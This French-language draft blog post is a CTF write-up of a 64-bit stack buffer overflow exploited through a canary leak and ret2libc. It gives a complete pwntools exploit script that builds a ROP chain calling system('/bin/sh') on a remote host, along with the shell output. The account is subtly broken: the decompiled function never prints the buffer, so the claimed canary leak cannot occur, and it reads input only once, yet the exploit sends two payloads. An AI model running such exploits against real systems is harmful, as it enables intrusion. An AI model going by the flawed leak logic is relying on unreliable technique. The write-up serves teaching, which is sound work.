---
title: "CTF - Stack Buffer Overflow classique"
date: 2026-10-06
draft: true
description: "Exploitation d'un buffer overflow stack avec bypass de canary et ret2libc. Post de dEmonstration."
tags: ["pwn", "stack", "ret2libc", "ctf", "x86-64"]
categories: ["writeup"]
showToc: true
tocOpen: true
---

## Contexte

Challenge de la catEgorie **pwn** d'un CTF fictif. Binaire 64 bits, protections partielles.
L'objectif est d'obtenir un shell sur le serveur distant.

```bash
$ file bin
bin: ELF 64-bit LSB executable, x86-64, dynamically linked

$ checksec bin
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

Pas de PIE, adresses du binaire fixes. NX actif, pas de shellcode sur la stack.
Canary prEsent, il faudra le leaker avant d'Ecraser RIP.

## Analyse statique

### DEcompilation de main

```c
void vuln(void) {
    char buf[64];
    printf("Entrez votre nom : ");
    read(0, buf, 256);   // overflow : 256 octets dans un buffer de 64
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

Le `read` Ecrit 256 octets dans `buf[64]` : overflow de **192 octets**.
Le canary est positionnE entre `buf` et le saved RBP, à `buf + 72`.

### Fonctions utiles dans le binaire

```bash
$ nm vuln | grep -E "puts|printf|system"
0000000000401050 T puts@plt
0000000000401060 T printf@plt
```

Pas de `system` dans le binaire, il faudra la rEsoudre via la libc.

## Exploitation

### Etape 1 - Leaker le canary

Le canary commence toujours par `\x00`. En Ecrivant exactement 72 octets on
Ecrase ce null byte, et `printf` lit jusqu'au prochain `\x00` :

```python
from pwn import *

elf  = ELF('./vuln')
libc = ELF('./libc.so.6')
io   = remote('challenge.ctf.example', 1337)

# Leak canary
io.sendafter(b'nom : ', b'A' * 72 + b'B')   # Ecrase le \x00 du canary
io.recvuntil(b'B')
canary = u64(b'\x00' + io.recv(7))           # recolle le null byte
log.success(f'Canary : {hex(canary)}')
```

### Etape 2 - Leaker une adresse libc (ret2plt)

On construit un premier payload pour appeler `puts(puts@got)` et rEcupErer
l'adresse rEelle de `puts` en mEmoire :

```python
POP_RDI  = 0x401203          # gadget : pop rdi ; ret
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
MAIN     = elf.symbols['main']
RET      = 0x40101a           # gadget : ret (alignement SSE)

payload  = b'A' * 72
payload += p64(canary)        # canary intact
payload += b'B' * 8           # saved RBP
payload += p64(POP_RDI)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT)      # puts(puts@got)
payload += p64(MAIN)          # retour sur main pour le 2e stage

io.sendafter(b'nom : ', payload)
leak       = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'Libc base : {hex(libc.address)}')
```

### Etape 3 - Shell (ret2libc)

```python
SYSTEM   = libc.symbols['system']
BIN_SH   = next(libc.search(b'/bin/sh\x00'))

payload2  = b'A' * 72
payload2 += p64(canary)
payload2 += b'B' * 8
payload2 += p64(RET)          # alignement
payload2 += p64(POP_RDI)
payload2 += p64(BIN_SH)
payload2 += p64(SYSTEM)

io.sendafter(b'nom : ', payload2)
io.interactive()
```

```bash
$ python3 exploit.py
[+] Canary  : 0x4f8ac1e2b7730900
[+] Libc base : 0x7f3a2c400000
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag
CTF{F4k3_fL4g}
```

## Ce qu'il faut retenir

- Un `read` sans vErification de taille suffit à tout compromettre, même avec canary + NX.
- Le canary se leake dès qu'une fonction d'affichage suit l'overflow sans vErifier la taille.
- Ret2libc fonctionne en deux passes : leak d'abord, exploitation ensuite.
- Gadget `ret` pour l'alignement stack sur x86-64 avant `system` : à ne pas oublier.

## REfErences

- [pwntools docs](https://docs.pwntools.com)
- [how2heap - heap/stack techniques](https://github.com/shellphish/how2heap)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
